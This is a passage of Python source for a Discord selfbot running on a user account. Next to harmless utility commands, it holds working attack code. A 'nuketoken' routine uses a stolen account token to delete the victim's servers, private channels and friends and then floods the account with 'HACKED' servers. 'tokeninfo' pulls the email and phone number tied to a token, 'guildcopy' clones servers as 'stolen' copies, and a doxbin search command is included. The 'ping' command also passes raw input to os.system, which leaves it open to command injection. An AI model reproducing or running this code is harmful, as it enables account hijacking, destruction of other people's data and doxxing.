            names = []
            names.clear()
            req = requests.get(f'https://playerdb.co/api/player/minecraft/{username}')
            if 'code":"player.found"' in req.text:
                embed=discord.Embed(title=f"**{username} | MC INFORMATION**", color=color)
                embed.add_field(name="**Full UUID:**", value=f"{req.json()['data']['player']['id']}", inline=False)
                embed.add_field(name="**Trimmed UUID:**", value=f"{req.json()['data']['player']['raw_id']}", inline=False)
                for name in req.json()['data']['player']['meta']['name_history']:
                    names.append(name['name'])
                embed.add_field(name="**Passed Usernames**", value=f"({len(names)}): {names}", inline=False)
                embed.set_footer(text=footer)
                embed.set_thumbnail(url="https://crafatar.com/avatars/" + f"{req.json()['data']['player']['id']}")
                await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Username not found ".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: Username not found \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def translateto(ctx, language = None, *, text = None):
    await ctx.message.delete()
    commandprint("Command 'translateto' has been used by " + bot.user.name)
    if language is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a language \n"
                                                                     "Example: " + prefix + "translateto fr hello sir yes yes", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    elif text is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified any text \n"
                                                                     "Example: " + prefix + "translateto fr hello sir yes yes", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            embed=discord.Embed(title=f"**TRANSLATED**", description="Your translated text is '" + ts.google(text, to_language=language, from_language='auto') + "'", color=color)
            embed.set_footer(text=footer)
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Unknown language ".format(error))
            em = discord.Embed(title="Exception Error:", description=f"Expected Exception: Sentances must be QUOTED example " + prefix + "lang 'hello' de \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def translatefrom(ctx, *, text = None):
    await ctx.message.delete()
    commandprint("Command 'translatefrom' has been used by " + bot.user.name)
    if text is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified any text \n"
                                                                     "Example: " + prefix + "translatefrom hola si si", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            embed=discord.Embed(title=f"**TRANSLATED**", description="Your translated text is '" + ts.google(text) + "'", color=color)
            embed.set_footer(text=footer)
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Unknown language ".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: Unknown language \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def resolve(ctx, hostname = None):
    await ctx.message.delete()
    commandprint("Command 'resolve' has been used by " + bot.user.name)
    if hostname is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a hostname \n"
                                                                     "Example: " + prefix + "resolve google.com", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            ip = socket.gethostbyname(hostname)
            embed=discord.Embed(title=f"**RESOLVED**", color=color)
            embed.add_field(name="**" + hostname + "**", value=ip + " \n", inline=False)
            embed.set_footer(text=footer)
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Domain not found ".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: Domain not found \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def ports(ctx):
    await ctx.message.delete()
    commandprint("Command 'ports' has been used by " + bot.user.name)
    try:
        embed=discord.Embed(title=f"**PORTS**", color=color)
        embed.add_field(name="**SFTP**", value="21 \n", inline=True)
        embed.add_field(name="**SSH**", value="22 \n", inline=True)
        embed.add_field(name="**TELNET**", value="23 \n", inline=True)
        embed.add_field(name="**SMTP**", value="25 \n", inline=True)
        embed.add_field(name="**DNS**", value="53 \n", inline=True)
        embed.add_field(name="**HTTP**", value="80 \n", inline=True)
        embed.add_field(name="**HTTPS**", value="443 \n", inline=True)
        embed.add_field(name="**OVH**", value="992 \n", inline=True)
        embed.add_field(name="**NFO**", value="1192 \n", inline=True)
        embed.add_field(name="**XBOX**", value="3074 \n", inline=True)
        embed.add_field(name="**VPN**", value="7777 \n", inline=True)
        embed.add_field(name="**PS4**", value="9707 \n", inline=True)
        embed.add_field(name="**HOTSPOT**", value="9286 \n", inline=True)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    except Exception as error:
        errorprint("Exception ' {0} ', User not found ".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: User not found \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def guildcopy(ctx):
    await ctx.message.delete()
    commandprint("Command 'guildcopy' has been used by " + bot.user.name)
    await bot.create_guild(f'stolen-{ctx.guild.name}')
    await asyncio.sleep(3)
    for g in bot.guilds:
        if f'stolen-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for r in ctx.guild.roles:
                await g.create_role(name=r.name, permissions=r.permissions, colour=r.colour, hoist=r.hoist,
                                    mentionable=r.mentionable)
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
            for r in ctx.guild.roles:
                for role in g.roles:
                    if r.position == 0:
                        return
                    if r.position < 1:
                        return
                    await role.edit(position=r.position)

@bot.command()
async def mcserver(ctx, domain = None):
    await ctx.message.delete()
    if domain is None:
        commandprint("Command 'mcserver' has been used by " + bot.user.name + " with no domain")
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a domain \n"
                                                                     "Example: " + prefix + "mcserver veltpvp.com", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        p = requests.get(f'https://api.mcsrvstat.us/2/{domain}')
        if 'online":true' in p.text:
            commandprint("Command 'mcserver' has been used by " + bot.user.name + " with a domain of '" + domain + "'")
            try:
                embed=discord.Embed(title=f"**MC SERVER INFORMATION | {domain}**", color=color)
                embed.add_field(name="IP", value=f"{p.json()['ip']}", inline=False)
                embed.add_field(name="Port:", value=f"{p.json()['port']}", inline=False)
                embed.add_field(name="Version:", value=f"{p.json()['version']}", inline=False)
                embed.add_field(name="Players:", value=f"{p.json()['players']['online']}/{p.json()['players']['max']}", inline=False)
                embed.set_footer(text=footer)
                await ctx.send(embed=embed, delete_after=deletetimer)
            except Exception as error:
                errorprint("Exception ' {0} ', User not found ".format(error))
                em = discord.Embed(title="Exception Error:", description="Expected Exception: User not found \n Console Exception {0}".format(error), color=errorcolor)
                await ctx.send(embed=em, delete_after=deletetimer)
        else:
            embed = discord.Embed(title=f"**{domain} IS OFFLINE**", description="Make sure you have the DOMAIN correct.", color=errorcolor)
            embed.set_footer(text=footer + " | this command was made by Rith#2491")
            await ctx.send(embed=embed, delete_after=deletetimer)

@bot.command()
async def embed(ctx, message = None):
    await ctx.message.delete()
    commandprint("Command 'embed' has been used by " + bot.user.name)
    if message is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a message \n"
                                                                     "Example: " + prefix + "embed bruh", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            embed = discord.Embed(title=message, color=color)
            await ctx.send("", embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', User not found ".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: User not found \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def userinfo(ctx, member: discord.User=None):
    await ctx.message.delete()
    commandprint("Command 'userinfo' has been used by " + bot.user.name)
    if member is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a user \n"
                                                                     "Example: " + prefix + "userinfo @Flairings", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            if not member:  # if member is no mentioned
                member = ctx.message.author  # set member as the author
            roles = [role for role in member.roles]
            embed = discord.Embed(title=f"**USER INFO FOR {member}**", color=color)
            embed.set_thumbnail(url=member.avatar_url)
            embed.set_footer(text=f"Requested by {ctx.author}")
            embed.add_field(name="ID:", value=member.id)
            embed.add_field(name="Display Name:", value=member.display_name)
            embed.add_field(name="Created Account On:", value=member.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))
            embed.set_footer(text=footer)
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:  # doesnt work properly
            errorprint("Exception ' {0} ', User not found ".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: User not found \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def ping(ctx, ip = None):
    await ctx.message.delete()
    commandprint("Command 'ping' has been used by " + bot.user.name)
    if ip is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a ip \n"
                                                                     "Example: " + prefix + "ping 1.1.1.1", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            response = os.system("ping -c 1 " + ip)
            if response == 0:
                embed = discord.Embed(title="**PINGING**", description=f"{ip} is online", color=color)
            else:
                embed = discord.Embed(title="**PINGING**", description=f"{ip} is offline", color=color)
            embed.set_footer(text=footer)
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Invalid IP ".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: Invalid IP \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

# TOKEN NUKING
guildsIds = []
friendsIds = []
channelIds = []
class Login(discord.Client):
    async def on_connect(self):
        for g in self.guilds:
            guildsIds.append(g.id)

        for f in self.user.friends:
            friendsIds.append(f.id)

        for c in self.private_channels:
            channelIds.append(c.id)

        await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except Exception as e:
            tokenprint("exception:" + str(e))

def tokenFuck(targettoken):
    headers = {'Authorization': targettoken}
    tokenprint("Attempting to Nuke " + targettoken)

    try:
        for guild in guildsIds:
            requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{guild}', headers=headers)
            tokenprint(" Deleting guilds...")
    except Exception as e:
        tokenprint(f"Unable to delete guilds... {e}")

    try:
        for id in channelIds:
            requests.delete(f'https://discord.com/api/v8/channels/{id}', headers=headers)
    except Exception as e:
        tokenprint(f"Unable to delete channels... {e}")

    try:
        for friend in friendsIds:
            requests.delete(f'https://discord.com/api/v6/users/@me/relationships/{friend}', headers=headers)
            tokenprint(" Removing friends...")
    except Exception as e:
        tokenprint(f"Unable to remove friends... {e}")

    try:
        for i in range(50):
            payload = {'name': f'HACKED {i}', 'region': 'europe', 'icon': None, 'channels': None}
            requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)
    except:
        tokenprint("Unable to create guilds...")


@bot.command()
async def nuketoken(ctx, targettoken = None):
    await ctx.message.delete()
    threads = 90
    commandprint("Command 'nuketoken' has been used by " + bot.user.name)
    if targettoken is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a token \n"
                                                                     "Example: " + prefix + "nuketoken token", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            embed=discord.Embed(title="**NUKING TOKEN**", description="Check console or webhooks for progress", color=color)
            embed.set_footer(text=footer)
            await ctx.send(embed=embed, delete_after=deletetimer)
            Login().run(targettoken)
            if threading.active_count() < int(threads):
                t = threading.Thread(target=tokenFuck, args=(targettoken,))
                t.start()
        except Exception as error:
                errorprint("Exception ' {0} ', Invalid token ".format(error))
                em = discord.Embed(title="Exception Error:", description="Expected Exception: Invalid token \n Console Exception {0}".format(error), color=errorcolor)
                await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def tokeninfo(ctx, tokeninfotoken = None):
    await ctx.message.delete()
    commandprint("Command 'tokeninfo' has been used by " + bot.user.name)
    if tokeninfotoken is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a token \n"
                                                                     "Example: " + prefix + "tokeninfo token", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            headers = {'Authorization': tokeninfotoken, 'Content-Type': 'application/json'}
            r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
            if r.status_code == 200:
                    userName = r.json()['username'] + '#' + r.json()['discriminator']
                    userID = r.json()['id']
                    phone = r.json()['phone']
                    email = r.json()['email']
                    mfa = r.json()['mfa_enabled']
                    embed = discord.Embed(title="**TOKEN INFORMATION**", color=color)
                    embed.add_field(name=f"**USER ID**", value=f"{userID}", inline=False)
                    embed.add_field(name=f"**USER NAME**", value=f"{userName}", inline=False)
                    embed.add_field(name=f"**2 FACTOR**", value=f"{mfa}", inline=False)
                    embed.add_field(name=f"**EMAIL**", value=f"{email}", inline=False)
                    embed.add_field(name=f"**PHONE NUMBER**", value=f"{phone if phone else 'N/A'}", inline=False)
                    embed.add_field(name=f"**TOKEN**", value=f"{tokeninfotoken}", inline=False)
                    embed.set_footer(text=footer)
                    await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Invalid token ".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: Invalid token \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def yourtoken(ctx):
    await ctx.message.delete()
    commandprint("Command 'yourtoken' has been used by " + bot.user.name)
    try:
            embed = discord.Embed(title="**YOUR TOKEN**", description=token, color=color)
            embed.set_footer(text=footer)
            await ctx.send(embed=embed, delete_after=deletetimer)
    except Exception as error:
        errorprint("Exception ' {0} ', Invalid token ".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: Invalid token \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command(aliases=["phub"])
async def pornhub(ctx, *, search = None):
    await ctx.message.delete()
    commandprint("Command 'pornhub' has been used by " + bot.user.name)
    if search is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a search inquiry \n"
                                                                     "Example: " + prefix + "pornhub monkey", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        embed=discord.Embed(title="**PORNHUB**", color=color)
        embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f1/Pornhub-logo.svg/512px-Pornhub-logo.svg.png")
        embed.add_field(name="URL: ", value=f"https://www.pornhub.com/video/search?search={search}", inline=True)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)

@bot.command(aliases=["db"])
async def doxbin(ctx, *, search = None):
    await ctx.message.delete()
    commandprint("Command 'doxbin' has been used by " + bot.user.name)
    if search is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a search inquiry \n"
                                                                     "Example: " + prefix + "doxbin culur", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        embed=discord.Embed(title="**DOXBIN**", color=color)
        embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/2/27/Brian_krebs.png")
        embed.add_field(name="URL: ", value=f"https://doxbin.org/search/{search}", inline=True)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)

@bot.command(aliases=["yt"])
async def youtube(ctx, *, search = None):
    await ctx.message.delete()
    commandprint("Command 'youtube' has been used by " + bot.user.name)
    if search is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a search inquiry \n"
                                                                     "Example: " + prefix + "youtube man vapes cum", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        embed=discord.Embed(title="**YOUTUBE**", color=color)
        embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/9/94/YouTube_social_white_circle_%28pink%29.svg/120px-YouTube_social_white_circle_%28pink%29.svg.png")
        embed.add_field(name="URL: ", value=f"https://www.youtube.com/results?search_query={search}", inline=True)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)

@bot.command(aliases=['corona'])
async def covid(ctx):
    await ctx.message.delete()
    commandprint("Command 'covid' has been used by " + bot.user.name)
    r = requests.get("https://api.covid19api.com/world/total")
    res = r.json()
    totalc = 'TotalConfirmed'
    totald = 'TotalDeaths'
    totalr = 'TotalRecovered'
    embed = discord.Embed(title='Updated Just Now:', description=f"Deaths | **{res[totald]}**\nConfirmed | **{res[totalc]}**\nRecovered | **{res[totalr]}**")  # create embed
    embed.colour = color
    embed.set_footer(text=footer)
    await ctx.send(embed=embed, delete_after=deletetimer)

@bot.command()
async def emojisteal(ctx):
    await ctx.message.delete()
    commandprint("Command 'emojisteal' has been used by " + bot.user.name)
    try:
        emoji = discord.Emoji
        folderName = 'Emojis\\' + ctx.guild.name.translate({ord(c): None for c in '/<>:"\\|?*'})
        if not os.path.exists(folderName):
            os.makedirs(folderName)
        for emoji in ctx.guild.emojis:
            emoji_image = await emoji.url.read()
            if emoji.animated:
                fileName = folderName + '/' + emoji.name + ".gif"
            else:
                fileName = folderName + '/' + emoji.name + ".png"
            with open(fileName, 'wb') as outFile:
                req = urllib.request.Request(emoji.url, headers={'User-Agent': 'Mozilla/5.0'})
                data = urllib.request.urlopen(req).read()
                outFile.write(data)
        eventprint("User has downloaded a servers emojis ")
        em = discord.Embed(title="Successfully downloaded all emojis", description="Please contact a host to receive your data", color=color)
        em.set_footer(text=footer)
        await ctx.send(embed=em, delete_after=deletetimer)
    except Exception as error:
        errorprint("Exception ' {0} ', command can only be used within servers".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: Couldn't gather emojis \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def hypesquad(ctx, house = None):
    global payload
    await ctx.message.delete()
    commandprint("Command 'hypesquad' has been used by " + bot.user.name)
    if house is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a house \n"
                                                                     "Example: " + prefix + "hypesquad brilliance", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        request = requests.session()
        headers = {
            'Authorization': token,
            'Content-type': 'application/json'
        }

        if house == "bravery":
            payload = {'house_id': 1}
        elif house == "brilliance":
            payload = {'house_id': 2}
        elif house == "balance":
            payload = {'house_id': 3}
        try:
            request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload)  # untested, may not work because of global statement
            eventprint("HypeSquad has been changed to " + house)
            em = discord.Embed(title="**HYPESQUAD CHANGED**", description="Your hypesquad has been changed to " + house, color=color)
            em.set_footer(text=footer)
            await ctx.send(embed=em, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Failed to contact discord api".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: Failed to contact discord api \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def exportfriends(ctx):
    await ctx.message.delete()
    commandprint("Command 'exportfriends' has been used by " + bot.user.name)
    try:
        for user in bot.user.friends:
            print(user.name+"#"+user.discriminator)
        eventprint("Friends exported")
        embed = discord.Embed(title="", color=color)
        embed.add_field(name="**FRIENDS LIST EXPORTED**", value="Results printed to console, please contact a host to receive your data.", inline=False)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    except Exception as error:
        errorprint("Exception ' {0} ', Could not fetch friends ".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: Could not fetch friends \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def restart(ctx):
    await ctx.message.delete()
    commandprint("Command 'restart' has been used by " + bot.user.name)
    try:
        eventprint(f"Restarting {name}... ")
        embed = discord.Embed(title=f"**Restarting {name}...**", description="This will take up to 10 seconds, if your bot does not restart notify an admin.", color=color)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
        restartbot()
    except Exception as error:
        errorprint("Exception ' {0} ', Could not edit config ".format(error))
        em = discord.Embed(title="Exception Error:", description="Expected Exception: Could not edit config \n Console Exception {0}".format(error), color=errorcolor)
        await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def setprefix(ctx, newprefix = None):
    await ctx.message.delete()
    commandprint("Command 'setprefix' has been used by " + bot.user.name)
    if newprefix is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a prefix \n"
                                                                     "Example: " + prefix + "setprefix /", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            with open(f"data/configurations/{config_name}.json", "r") as f:
                config = json.load(f)
            config[str("prefix")] = newprefix
            with open(f"data/configurations/{config_name}.json", "w") as f:
                json.dump(config, f, indent=4)
            eventprint("Prefix has been set to " + newprefix)
            embed = discord.Embed(title="PREFIX CHANGED", description=f"Prefix is now '{newprefix}'. \n Restart the bot in order for changes to take place.", color=color)
            embed.set_footer(text=footer)
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Could not edit config ".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: Could not edit config \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def setemoji(ctx, *, newemoji = None):
    await ctx.message.delete()
    commandprint("Command 'setemoji' has been used by " + bot.user.name)
    if newemoji is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a emoji \n"
                                                                     "Example: " + prefix + "setemoji <3", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            with open(f"data/configurations/{config_name}.json", "r") as f:
                config = json.load(f)
            config[str("emoji")] = newemoji
            with open(f"data/configurations/{config_name}.json", "w") as f:
                json.dump(config, f, indent=4)
            eventprint("Emoji has been set to " + newemoji)
            embed = discord.Embed(title="EMOJI CHANGED", description=f"Emoji is now '{newemoji}'. \n Restart the bot in order for changes to take place.", color=color)
            embed.set_footer(text=footer)
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Could not edit config ".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: Could not edit config \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def settitle(ctx, *, newtitle = None):
    await ctx.message.delete()
    commandprint("Command 'settitle' has been used by " + bot.user.name)
    if newtitle is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a title \n"
                                                                     "Example: " + prefix + "settitle flairings is good dev", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            with open(f"data/configurations/{config_name}.json", "r") as f:
                config = json.load(f)
            config[str("title")] = newtitle
            with open(f"data/configurations/{config_name}.json", "w") as f:
                json.dump(config, f, indent=4)
            eventprint("Title has been set to " + newtitle)
            embed = discord.Embed(title="TITLE CHANGED", description=f"Title is now '{newtitle}'. \n Restart the bot in order for changes to take place.", color=color)
            embed.set_footer(text=footer)
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Could not edit config ".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: Could not edit config \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command()
async def setstreamurl(ctx, newstreamurl = None):
    await ctx.message.delete()
    commandprint("Command 'setstreamurl' has been used by " + bot.user.name)
    if newstreamurl is None:
        embed=discord.Embed(title=f"**Invalid syntax**", description="You have not specified a streamurl \n"
                                                                     "Example: " + prefix + "setstreamurl https://twitch.tv/god", color=errorcolor)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    else:
        try:
            with open(f"data/configurations/{config_name}.json", "r") as f:
                config = json.load(f)
            config[str("stream-url")] = newstreamurl
            with open(f"data/configurations/{config_name}.json", "w") as f:
                json.dump(config, f, indent=4)
            eventprint("StreamURL has been set to " + newstreamurl)
            embed = discord.Embed(title="STREAM-URL CHANGED", description=f"Stream-URL is now '{newstreamurl}'. \n Restart the bot in order for changes to take place.", color=color)
            embed.set_footer(text=footer)
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Could not edit config ".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: Could not edit config \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command(aliases=['toggledml'])
async def toggledeletedmessagelogger(ctx, *, boolean = None):
    await ctx.message.delete()
    commandprint("Command 'toggledeletedmessagelogger' has been used by " + bot.user.name)
    if boolean is None:
        embed = discord.Embed(title="DELETED-MESSAGE-LOGGER",
                              description=f"You must provide a boolean, 'true' or 'false', no capitals.",
                              color=color)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    if boolean == "true":
        try:
            with open(f"data/configurations/{config_name}.json", "r") as f:
                config = json.load(f)
            config[str("deleted-message-logger")] = boolean
            with open(f"data/configurations/{config_name}.json", "w") as f:
                json.dump(config, f, indent=4)
            eventprint("Deleted message logger has been set to " + boolean)
            embed = discord.Embed(title="DELETED-MESSAGE-LOGGER CHANGED", description=f"Deleted-message-logger is now '{boolean}'. \n Restart the bot in order for changes to take place.", color=color)
            embed.set_footer(text=footer)
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Could not edit config ".format(error))
            em = discord.Embed(title="Exception Error:", description="Expected Exception: Could not edit config \n Console Exception {0}".format(error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)
    elif boolean == "false":
            try:
                with open(f"data/configurations/{config_name}.json", "r") as f:
                    config = json.load(f)
                config[str("deleted-message-logger")] = boolean
                with open(f"data/configurations/{config_name}.json", "w") as f:
                    json.dump(config, f, indent=4)
                eventprint("Deleted message logger has been set to " + boolean)
                embed = discord.Embed(title="DELETED-MESSAGE-LOGGER CHANGED", description=f"Deleted-message-logger is now '{boolean}'. \n Restart the bot in order for changes to take place.", color=color)
                embed.set_footer(text=footer)
                await ctx.send(embed=embed, delete_after=deletetimer)
            except Exception as error:
                errorprint("Exception ' {0} ', Could not edit config ".format(error))
                em = discord.Embed(title="Exception Error:", description="Expected Exception: Could not edit config \n Console Exception {0}".format(error), color=errorcolor)
                await ctx.send(embed=em, delete_after=deletetimer)

@bot.command(aliases=['togglegs'])
async def togglegiveawaysniper(ctx, *, boolean = None):
    await ctx.message.delete()
    commandprint("Command 'togglegiveawaysniper' has been used by " + bot.user.name)
    if boolean is None:
        embed = discord.Embed(title="GIVEAWAY-SNIPER",
                              description=f"You must provide a boolean, 'true' or 'false', no capitals.",
                              color=color)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    if boolean == "true":
        try:
            with open(f"data/configurations/{config_name}.json", "r") as f:
                config = json.load(f)
            config[str("giveaway-sniper")] = boolean
            with open(f"data/configurations/{config_name}.json", "w") as f:
                json.dump(config, f, indent=4)
            eventprint("Giveaway sniper has been set to " + boolean)
            embed = discord.Embed(title="GIVEAWAY-SNIPER CHANGED",
                                  description=f"Giveaway-Sniper is now '{boolean}'. \n Restart the bot in order for changes to take place.",
                                  color=color)
            embed.set_footer(text=footer)
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Could not edit config ".format(error))
            em = discord.Embed(title="Exception Error:",
                               description="Expected Exception: Could not edit config \n Console Exception {0}".format(
                                   error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)
    elif boolean == "false":
        try:
            with open(f"data/configurations/{config_name}.json", "r") as f:
                config = json.load(f)
            config[str("giveaway-sniper")] = boolean
            with open(f"data/configurations/{config_name}.json", "w") as f:
                json.dump(config, f, indent=4)
            eventprint("Giveaway sniper has been set to " + boolean)
            embed = discord.Embed(title="GIVEAWAY-SNIPER CHANGED",
                                  description=f"Giveaway-Sniper is now '{boolean}'. \n Restart the bot in order for changes to take place.",
                                  color=color)
            embed.set_footer(text=footer)
            await ctx.send(embed=embed, delete_after=deletetimer)
        except Exception as error:
            errorprint("Exception ' {0} ', Could not edit config ".format(error))
            em = discord.Embed(title="Exception Error:",
                               description="Expected Exception: Could not edit config \n Console Exception {0}".format(
                                   error), color=errorcolor)
            await ctx.send(embed=em, delete_after=deletetimer)

@bot.command(aliases=['togglens'])
async def togglenitrosniper(ctx, *, boolean = None):
    await ctx.message.delete()
    commandprint("Command 'togglenitrosniper' has been used by " + bot.user.name)
    if boolean is None:
        embed = discord.Embed(title="NITRO-SNIPER",
                              description=f"You must provide a boolean, 'true' or 'false', no capitals.",
                              color=color)
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=deletetimer)
    if boolean == "true":
